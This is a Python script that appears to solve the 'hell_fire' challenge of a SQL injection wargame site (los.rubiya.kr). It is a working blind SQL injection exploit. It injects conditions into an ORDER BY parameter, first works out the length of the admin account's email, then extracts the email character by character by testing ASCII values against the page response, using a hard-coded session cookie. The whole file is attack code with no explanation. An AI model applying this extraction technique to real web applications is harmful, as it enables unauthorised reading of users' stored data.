import requests

cookies={'PHPSESSID':'8pt5qvotaijsant070i27b03jq'}
length=0
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    address="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
    url=address+"?order=length(email)="+str(length)+",id='rubiya'"
    length+=1
    res=requests.get(url,cookies=cookies)
    if  "<tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr><tr><td>admin</td><td>**************</td><td>200</td></tr>" in res.text:
        length-=1
        print("email은 "+str(length)+"자리")
        break
    else:
        print(str(length-1)+": X")
i=length
pw=""
for a in range(1,i+1):
    for b in range(33,128):
        url = address + "?order=ascii(substr(email,"+str(a)+",1))="+str(b)+",id='rubiya'"
        res=requests.get(url,cookies=cookies)

        if "<tr><td>rubiya</td><td>rubiya805@gmail.cm</td><td>100</td></tr><tr><td>admin</td><td>**************</td><td>200</td></tr>" in res.text:
            print(str(a)+"of pw=>"+chr(b))
            pw+=chr(b)
            break
        else:
            print(chr(b)+" : X")
            continue
        pw+=" "

print(pw)

